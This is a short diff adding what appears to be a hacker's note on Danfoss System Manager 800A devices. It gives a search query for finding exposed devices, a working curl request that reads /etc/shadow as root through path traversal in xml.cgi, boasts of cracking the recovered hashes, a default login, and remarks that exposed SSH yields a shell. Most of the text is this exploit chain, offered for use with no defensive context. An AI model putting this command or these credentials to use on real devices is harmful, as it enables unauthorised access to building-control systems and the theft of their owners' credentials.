@@ -1,0 +1,15 @@
+http.favicon.hash:-853297641 html:main
+
+danfoss System Manager 800A
+
+arbitrary file read as root
+
+curl -s -k -X POST "$line/xml.cgi" -d "xml=%3Ccmd%20action%3D%22get_file%22%20filename%3D%22../../etc/shadow%22%20offset%3D%220%22%2F%3E
+
+i managed to crack shiton of password contained in shadow (lots are really ez : 1,123,12345)
+
+there is a default password (Superviseur:12345)
+
+if there's a ssh exposed, you have a shell :p
+
+attached scan.sh
